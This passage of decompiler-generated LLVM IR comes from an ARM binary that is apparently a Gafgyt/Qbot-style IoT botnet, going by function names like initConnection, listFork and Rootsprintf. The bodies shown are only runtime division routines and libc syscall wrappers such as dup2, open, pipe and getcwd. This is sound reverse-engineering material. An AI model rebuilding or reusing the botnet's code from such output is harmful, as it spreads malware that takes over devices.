  uselistorder i32 %v3_eca4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_ec18, { 1, 0 }
  uselistorder i32 %v1_ebfc, { 1, 0 }
  uselistorder i32 %v5_eb38, { 1, 0 }
  uselistorder i32 %v1_eacc, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_eae8, { 1, 0 }
  uselistorder i32 %v2_eadc, { 1, 0 }
  uselistorder i32 %v2_f008, { 2, 3, 4, 1, 0 }
  uselistorder i8* %v4_f288, { 3, 0, 1, 2 }
  uselistorder i32 %v2_f278, { 9, 0, 3, 5, 4, 7, 6, 8, 1, 2 }
  uselistorder i32 %v0_e984, { 1, 0, 2, 3 }
  uselistorder i32 %v3_e938, { 1, 0, 2 }
  uselistorder i32 %v2_e89c, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_264a0.61, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_2c708.64, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 (i32, i32, i32, i32)* @Rootsprintf, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder i32* @global_var_2c6fc.77, { 1, 0, 3, 2 }
  uselistorder i32* @global_var_26498.45, { 2, 3, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 -600, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder [2 x i8]* @global_var_1c3c0.265, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_1c3c0.265 to i32), { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 19, 20, 21, 0, 1, 15, 16 }
  uselistorder i32 ptrtoint (i32* @global_var_1c3a8.261 to i32), { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f268.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_f224, { 1, 0 }
  uselistorder label %dec_label_pc_f1d4, { 1, 0 }
  uselistorder label %dec_label_pc_f100, { 1, 0 }
  uselistorder label %dec_label_pc_f0d4, { 1, 0 }
  uselistorder label %dec_label_pc_f09c, { 1, 0 }
  uselistorder label %dec_label_pc_ef98, { 1, 0 }
  uselistorder label %dec_label_pc_ef74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ef64, { 1, 0 }
  uselistorder label %dec_label_pc_eeec, { 1, 0 }
  uselistorder label %dec_label_pc_ee58, { 1, 0 }
  uselistorder label %dec_label_pc_ee1c, { 1, 0 }
  uselistorder label %dec_label_pc_ed5c, { 1, 0 }
  uselistorder label %dec_label_pc_ece4, { 1, 0 }
  uselistorder label %dec_label_pc_ec54, { 1, 0 }
  uselistorder label %dec_label_pc_eb1c, { 1, 0 }
  uselistorder label %dec_label_pc_ea34, { 1, 0 }
  uselistorder label %dec_label_pc_ea24.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ea0c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e980, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_e858, { 1, 0 }
  uselistorder label %dec_label_pc_e7e4, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_f2f0 = load i32, i32* @r1, align 4
  %v1_f2f0 = add i32 %v0_f2f0, -1
  store i32 %v1_f2f0, i32* %r2.global-to-local, align 4
  %v2_f2f0 = icmp eq i32 %v0_f2f0, 0
  %v7_f2f0 = icmp eq i32 %v0_f2f0, 1
  %v0_f2f4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_f2f0, i32 %v0_f2f4)
  br i1 %v2_f2f0, label %dec_label_pc_f3d8, label %dec_label_pc_f2fc

dec_label_pc_f2fc:                                ; preds = %entry
  %v0_f2fc = load i32, i32* %r0.global-to-local, align 4
  %v1_f2fc = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_f2fc, %v1_f2fc
  br i1 %tmp, label %dec_label_pc_f304, label %dec_label_pc_f390

dec_label_pc_f304:                                ; preds = %dec_label_pc_f2fc
  %v1_f304 = load i32, i32* %r2.global-to-local, align 4
  %v2_f304 = and i32 %v1_f304, %v1_f2fc
  %v4_f304 = icmp eq i32 %v2_f304, 0
  br i1 %v4_f304, label %dec_label_pc_f39c, label %dec_label_pc_f30c

dec_label_pc_f30c:                                ; preds = %dec_label_pc_f304
  %v3_f30c = icmp ult i32 %v1_f2fc, 536870912
  br i1 %v3_f30c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_f30c
  %v4_f310 = mul i32 %v1_f2fc, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_f30c, %.thread
  %v0_f330.pr36.ph = phi i32 [ %v4_f310, %.thread ], [ %v1_f2fc, %dec_label_pc_f30c ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_f30c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_f330.pr36 = phi i32 [ %v4_f324, %bb81 ], [ %v0_f330.pr36.ph, %.preheader.preheader ]
  %v1_f328 = phi i32 [ %v4_f328, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_f31c = icmp ugt i32 %v0_f330.pr36, 268435455
  br i1 %v2_f31c, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_f330thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_f320 = icmp ult i32 %v0_f330.pr36, %v0_f2fc
  br i1 %v4_f320, label %bb80, label %dec_label_pc_f330thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_f324 = and i32 %v0_f330.pr36, 268435456
  %v3_f324 = icmp eq i32 %v2_f324, 0
  %v4_f324 = mul i32 %v0_f330.pr36, 16
  br i1 %v3_f324, label %bb81, label %dec_label_pc_f330.loopexit

bb81:                                             ; preds = %bb80
  %v2_f328 = and i32 %v1_f328, 268435456
  %v3_f328 = icmp eq i32 %v2_f328, 0
  %v4_f328 = mul i32 %v1_f328, 16
  br i1 %v3_f328, label %.preheader, label %dec_label_pc_f330thread-pre-split.loopexit.loopexit

dec_label_pc_f330thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_f33c48.ph = phi i32 [ %v1_f328, %bb ], [ %v4_f328, %bb81 ]
  %v0_f330.pr38.ph = phi i32 [ %v0_f330.pr36, %bb ], [ %v4_f324, %bb81 ]
  br label %dec_label_pc_f330thread-pre-split.loopexit

dec_label_pc_f330thread-pre-split.loopexit:       ; preds = %dec_label_pc_f330thread-pre-split.loopexit.loopexit, %.thread2
  %v1_f33c48 = phi i32 [ %v1_f328, %.thread2 ], [ %v1_f33c48.ph, %dec_label_pc_f330thread-pre-split.loopexit.loopexit ]
  %v0_f330.pr38 = phi i32 [ %v0_f330.pr36, %.thread2 ], [ %v0_f330.pr38.ph, %dec_label_pc_f330thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f330thread-pre-split

dec_label_pc_f330thread-pre-split:                ; preds = %dec_label_pc_f330thread-pre-split.loopexit, %bb83
  %v1_f33c46 = phi i32 [ %v1_f33c48, %dec_label_pc_f330thread-pre-split.loopexit ], [ %v3_f33c, %bb83 ]
  %v0_f330.pr = phi i32 [ %v0_f330.pr38, %dec_label_pc_f330thread-pre-split.loopexit ], [ %v3_f338, %bb83 ]
  br label %dec_label_pc_f330

dec_label_pc_f330.loopexit:                       ; preds = %bb80
  br label %dec_label_pc_f330

dec_label_pc_f330:                                ; preds = %dec_label_pc_f330.loopexit, %dec_label_pc_f330thread-pre-split
  %v1_f33c = phi i32 [ %v1_f33c46, %dec_label_pc_f330thread-pre-split ], [ %v1_f328, %dec_label_pc_f330.loopexit ]
  %v1_f338 = phi i32 [ %v0_f330.pr, %dec_label_pc_f330thread-pre-split ], [ %v4_f324, %dec_label_pc_f330.loopexit ]
  %v2_f330 = icmp slt i32 %v1_f338, 0
  br i1 %v2_f330, label %dec_label_pc_f344, label %bb82

bb82:                                             ; preds = %dec_label_pc_f330
  %v4_f334 = icmp ult i32 %v1_f338, %v0_f2fc
  br i1 %v4_f334, label %bb83, label %dec_label_pc_f344

bb83:                                             ; preds = %bb82
  %v3_f338 = mul i32 %v1_f338, 2
  %v2_f33c = icmp slt i32 %v1_f33c, 0
  %v3_f33c = mul i32 %v1_f33c, 2
  br i1 %v2_f33c, label %dec_label_pc_f344, label %dec_label_pc_f330thread-pre-split

dec_label_pc_f344:                                ; preds = %bb82, %dec_label_pc_f330, %bb83
  %v2_f35059 = phi i32 [ %v3_f33c, %bb83 ], [ %v1_f33c, %bb82 ], [ %v1_f33c, %dec_label_pc_f330 ]
  %v1_f34851 = phi i32 [ %v3_f338, %bb83 ], [ %v1_f338, %bb82 ], [ %v1_f338, %dec_label_pc_f330 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f348

dec_label_pc_f348:                                ; preds = %.thread11, %dec_label_pc_f344
  %v1_f37c = phi i32 [ %v4_f37c, %.thread11 ], [ %v2_f35059, %dec_label_pc_f344 ]
  %v1_f350 = phi i32 [ %v0_f388, %.thread11 ], [ 0, %dec_label_pc_f344 ]
  %v1_f380 = phi i32 [ %v4_f380, %.thread11 ], [ %v1_f34851, %dec_label_pc_f344 ]
  %v1_f34c = phi i32 [ %v0_f378, %.thread11 ], [ %v0_f2fc, %dec_label_pc_f344 ]
  %v3_f348 = icmp ult i32 %v1_f34c, %v1_f380
  br i1 %v3_f348, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_f348
  %v3_f34c = sub i32 %v1_f34c, %v1_f380
  store i32 %v3_f34c, i32* %r0.global-to-local, align 4
  %v3_f350 = or i32 %v1_f350, %v1_f37c
  store i32 %v3_f350, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_f348, %bb84
  %v1_f358 = phi i32 [ %v1_f34c, %dec_label_pc_f348 ], [ %v3_f34c, %bb84 ]
  %v1_f35c = phi i32 [ %v1_f350, %dec_label_pc_f348 ], [ %v3_f350, %bb84 ]
  %v4_f354 = udiv i32 %v1_f380, 2
  %v6_f354 = icmp ult i32 %v1_f358, %v4_f354
  br i1 %v6_f354, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_f358 = urem i32 %v1_f380, 2
  %v4_f358 = icmp eq i32 %v3_f358, 0
  %v6_f358 = sub i32 %v1_f358, %v4_f354
  store i32 %v6_f358, i32* %r0.global-to-local, align 4
  br i1 %v4_f358, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_f35c = udiv i32 %v1_f37c, 2
  %v6_f35c = or i32 %v1_f35c, %v5_f35c
  store i32 %v6_f35c, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_f364 = phi i32 [ %v6_f358, %bb85 ], [ %v1_f358, %.thread7 ], [ %v6_f358, %bb86 ]
  %v1_f368 = phi i32 [ %v1_f35c, %bb85 ], [ %v1_f35c, %.thread7 ], [ %v6_f35c, %bb86 ]
  %v4_f360 = udiv i32 %v1_f380, 4
  %v6_f360 = icmp ult i32 %v1_f364, %v4_f360
  br i1 %v6_f360, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_f364 = and i32 %v1_f380, 2
  %v4_f364 = icmp eq i32 %v3_f364, 0
  %v6_f364 = sub i32 %v1_f364, %v4_f360
  store i32 %v6_f364, i32* %r0.global-to-local, align 4
  br i1 %v4_f364, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_f368 = udiv i32 %v1_f37c, 4
  %v6_f368 = or i32 %v1_f368, %v5_f368
  store i32 %v6_f368, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_f370 = phi i32 [ %v6_f364, %bb87 ], [ %v1_f364, %.thread8 ], [ %v6_f364, %bb88 ]
  %v1_f374 = phi i32 [ %v1_f368, %bb87 ], [ %v1_f368, %.thread8 ], [ %v6_f368, %bb88 ]
  %v4_f36c = udiv i32 %v1_f380, 8
  %v6_f36c = icmp ult i32 %v1_f370, %v4_f36c
  br i1 %v6_f36c, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_f370 = and i32 %v1_f380, 4
  %v4_f370 = icmp eq i32 %v3_f370, 0
  %v6_f370 = sub i32 %v1_f370, %v4_f36c
  store i32 %v6_f370, i32* %r0.global-to-local, align 4
  br i1 %v4_f370, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_f374 = udiv i32 %v1_f37c, 8
  %v6_f374 = or i32 %v1_f374, %v5_f374
  store i32 %v6_f374, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_f388 = phi i32 [ %v1_f374, %bb89 ], [ %v1_f374, %.thread9 ], [ %v6_f374, %bb90 ]
  %v0_f378 = phi i32 [ %v6_f370, %bb89 ], [ %v1_f370, %.thread9 ], [ %v6_f370, %bb90 ]
  %v2_f378 = icmp eq i32 %v0_f378, 0
  br i1 %v2_f378, label %dec_label_pc_f388, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_f37c, 16
  br i1 %tmp138, label %dec_label_pc_f388, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_f37c = udiv i32 %v1_f37c, 16
  %v4_f380 = udiv i32 %v1_f380, 16
  br label %dec_label_pc_f348

dec_label_pc_f388:                                ; preds = %thread-pre-split, %bb91
  store i32 %v0_f388, i32* %r0.global-to-local, align 4
  ret i32 %v0_f388

dec_label_pc_f390:                                ; preds = %dec_label_pc_f2fc
  %v9_f2fc = icmp eq i32 %v0_f2fc, %v1_f2fc
  %. = zext i1 %v9_f2fc to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_f39c:                                ; preds = %dec_label_pc_f304
  %v2_f39c = icmp ugt i32 %v1_f2fc, 65535
  br i1 %v2_f39c, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_f39c
  %v2_f3a0 = and i32 %v1_f2fc, 32768
  %v3_f3a0 = icmp eq i32 %v2_f3a0, 0
  %v4_f3a0 = udiv i32 %v1_f2fc, 65536
  br i1 %v3_f3a0, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_f39c
  %v0_f3ac65 = phi i32 [ %v1_f2fc, %dec_label_pc_f39c ], [ %v4_f3a0, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_f3b0 = phi i32 [ %v0_f3ac65, %.thread16 ], [ %v4_f3a0, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_f3ac = icmp ugt i32 %v1_f3b0, 255
  br i1 %v2_f3ac, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_f3b0 = and i32 %v1_f3b0, 128
  %v3_f3b0 = icmp eq i32 %v2_f3b0, 0
  %v4_f3b0 = udiv i32 %v1_f3b0, 256
  br i1 %v3_f3b0, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_f3b4 = or i32 %storemerge, 8
  store i32 %v2_f3b4, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_f3c0 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_f3b4, %bb98 ]
  %v1_f3bc = phi i32 [ %v1_f3b0, %bb96 ], [ %v4_f3b0, %bb97 ], [ %v4_f3b0, %bb98 ]
  %v2_f3b8 = icmp ugt i32 %v1_f3bc, 15
  br i1 %v2_f3b8, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_f3bc = and i32 %v1_f3bc, 8
  %v3_f3bc = icmp eq i32 %v2_f3bc, 0
  %v4_f3bc = udiv i32 %v1_f3bc, 16
  br i1 %v3_f3bc, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_f3c0 = add nsw i32 %v1_f3c0, 4
  store i32 %v2_f3c0, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_f3c8 = phi i32 [ %v1_f3c0, %.thread17 ], [ %v1_f3c0, %bb99 ], [ %v2_f3c0, %bb100 ]
  %v5_f3cc = phi i32 [ %v1_f3bc, %.thread17 ], [ %v4_f3bc, %bb99 ], [ %v4_f3bc, %bb100 ]
  %v2_f3c4 = icmp ugt i32 %v5_f3cc, 3
  %v7_f3c4 = icmp eq i32 %v5_f3cc, 4
  %v2_f3c8 = xor i1 %v7_f3c4, true
  %v3_f3c8 = and i1 %v2_f3c4, %v2_f3c8
  br i1 %v3_f3c8, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_f3c8 = add nsw i32 %v4_f3c8, 3
  store i32 %v5_f3c8, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_f3cc = phi i32 [ %v4_f3c8, %.thread18 ], [ %v5_f3c8, %bb101 ]
  %v2_f3cc = xor i1 %v2_f3c4, true
  %v3_f3cc = or i1 %v7_f3c4, %v2_f3cc
  br i1 %v3_f3cc, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_f3cc = udiv i32 %v5_f3cc, 2
  %v9_f3cc = add i32 %v4_f3cc, %v8_f3cc
  store i32 %v9_f3cc, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_f3d0 = phi i32 [ %v4_f3cc, %bb102 ], [ %v9_f3cc, %bb103 ]
  %v6_f3d0 = lshr i32 %v0_f2fc, %v1_f3d0
  store i32 %v6_f3d0, i32* %r0.global-to-local, align 4
  ret i32 %v6_f3d0

dec_label_pc_f3d8:                                ; preds = %entry
  %v0_f3dc = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_f3cc, { 1, 0 }
  uselistorder i1 %v7_f3c4, { 1, 0 }
  uselistorder i32 %v4_f3bc, { 1, 0 }
  uselistorder i32 %v1_f3bc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_f3b4, { 1, 0 }
  uselistorder i32 %v4_f3b0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f3b0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_f3a0, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_f378, { 1, 0 }
  uselistorder i32 %v0_f388, { 1, 0, 2 }
  uselistorder i32 %v4_f36c, { 1, 0 }
  uselistorder i32 %v1_f374, { 1, 2, 0 }
  uselistorder i32 %v4_f360, { 1, 0 }
  uselistorder i32 %v1_f368, { 1, 2, 0 }
  uselistorder i32 %v4_f354, { 1, 0 }
  uselistorder i32 %v1_f35c, { 1, 2, 0 }
  uselistorder i32 %v1_f380, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_f350, { 1, 0 }
  uselistorder i32 %v1_f37c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_f33c, { 1, 0 }
  uselistorder i32 %v3_f338, { 1, 0 }
  uselistorder i32 %v1_f338, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_f33c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_f328, { 1, 0 }
  uselistorder i32 %v4_f324, { 2, 1, 0 }
  uselistorder i32 %v1_f328, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_f330.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_f2fc, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_f2fc, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_f2f0, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_f388, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_f344, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f330thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_f3f0 = udiv i32 %arg1, %arg2
  ret i32 %v2_f3f0
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_f40c = call i32 @__GI_raise(i32 8)
  ret i32 %v1_f40c
}

define i32 @function_f418(i32 %arg1) local_unnamed_addr {
dec_label_pc_f418:
  ret i32 %arg1
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_f430 = load i32, i32* @r0, align 4
  %v2_f430 = icmp ugt i32 %v0_f430, -4097
  br i1 %v2_f430, label %bb1, label %bb

bb:                                               ; preds = %entry
  ret i32 %v0_f430

bb1:                                              ; preds = %entry
  %v4_f43c = icmp eq i32 %v0_f430, -38
  br i1 %v4_f43c, label %dec_label_pc_f444, label %bb2

dec_label_pc_f444:                                ; preds = %bb1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_f444, %bb1
  %v0_f45c = call i32 @__syscall_error()
  ret i32 %v0_f45c
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f460 = load i32, i32* @r7, align 4
  store i32 %v3_f460, i32* %stack_var_-8, align 4
  %v0_f46c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f46c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f46c, -4095
  br i1 %tmp, label %dec_label_pc_f48c, label %dec_label_pc_f47c

dec_label_pc_f47c:                                ; preds = %entry
  %v0_f47c = call i32 @__GI___errno_location()
  %v0_f480 = load i32, i32* %r7.global-to-local, align 4
  %v1_f480 = sub i32 0, %v0_f480
  %v2_f484 = inttoptr i32 %v0_f47c to i32*
  store i32 %v1_f480, i32* %v2_f484, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f48c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f48c

dec_label_pc_f48c:                                ; preds = %entry, %dec_label_pc_f47c
  %v1_f490 = phi i32 [ %v0_f46c, %entry ], [ -1, %dec_label_pc_f47c ]
  %v2_f48c = phi i32 [ %v3_f460, %entry ], [ %v2_f48c.pre, %dec_label_pc_f47c ]
  store i32 %v2_f48c, i32* @r7, align 4
  ret i32 %v1_f490

; uselistorder directives
  uselistorder i32 %v0_f46c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f48c, { 1, 0 }
}

define i32 @__GI_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_f494 = load i32, i32* @r2, align 4
  %v9_f494 = load i32, i32* @r3, align 4
  store i32 %v9_f494, i32* %stack_var_-4, align 4
  %v1_f4a4 = and i32 %arg2, 64
  %v2_f4a4 = icmp eq i32 %v1_f4a4, 0
  br i1 %v2_f4a4, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v3_f4ac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_f4ac, i32* @r3, align 4
  %phitmp = urem i32 %v6_f494, 65536
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v0_f4b0 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_f4b0, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f4e0, label %dec_label_pc_f4d0

dec_label_pc_f4d0:                                ; preds = %.thread
  %v0_f4d0 = call i32 @__GI___errno_location()
  %v0_f4d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_f4d4 = sub i32 0, %v0_f4d4
  store i32 %v1_f4d4, i32* @r3, align 4
  %v2_f4d8 = inttoptr i32 %v0_f4d0 to i32*
  store i32 %v1_f4d4, i32* %v2_f4d8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f4e0

dec_label_pc_f4e0:                                ; preds = %.thread, %dec_label_pc_f4d0
  %v0_f4e0 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_f4d0 ]
  ret i32 %v0_f4e0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f4e0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f4f4 = load i32, i32* @r7, align 4
  store i32 %v3_f4f4, i32* %stack_var_-8, align 4
  %v0_f500 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f500, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f500, -4095
  br i1 %tmp, label %dec_label_pc_f520, label %dec_label_pc_f510

dec_label_pc_f510:                                ; preds = %entry
  %v0_f510 = call i32 @__GI___errno_location()
  %v0_f514 = load i32, i32* %r7.global-to-local, align 4
  %v1_f514 = sub i32 0, %v0_f514
  %v2_f518 = inttoptr i32 %v0_f510 to i32*
  store i32 %v1_f514, i32* %v2_f518, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f520.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f520

dec_label_pc_f520:                                ; preds = %entry, %dec_label_pc_f510
  %v1_f524 = phi i32 [ %v0_f500, %entry ], [ -1, %dec_label_pc_f510 ]
  %v2_f520 = phi i32 [ %v3_f4f4, %entry ], [ %v2_f520.pre, %dec_label_pc_f510 ]
  store i32 %v2_f520, i32* @r7, align 4
  ret i32 %v1_f524

; uselistorder directives
  uselistorder i32 %v0_f500, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f520, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_f528 = load i32, i32* @r4, align 4
  %v6_f528 = load i32, i32* @r5, align 4
  %v9_f528 = load i32, i32* @r6, align 4
  %v12_f528 = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_f52c = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r4, align 4
  %v2_f53c = icmp eq i32 %arg1, 0
  br i1 %v2_f52c, label %dec_label_pc_f53c, label %dec_label_pc_f56c

dec_label_pc_f53c:                                ; preds = %entry
  br i1 %v2_f53c, label %dec_label_pc_f558, label %dec_label_pc_f544

dec_label_pc_f544:                                ; preds = %dec_label_pc_f53c
  %v0_f544 = call i32 @__GI___errno_location()
  %v0_f548 = load i32, i32* @r6, align 4
  store i32 %v0_f548, i32* @r4, align 4
  %v2_f550 = inttoptr i32 %v0_f544 to i32*
  store i32 22, i32* %v2_f550, align 4
  br label %dec_label_pc_f604

dec_label_pc_f558:                                ; preds = %dec_label_pc_f53c
  %v0_f558 = call i32 @__GI_getpagesize()
  %v5_f560 = icmp slt i32 %v0_f558, 4096
  br i1 %v5_f560, label %bb16, label %bb

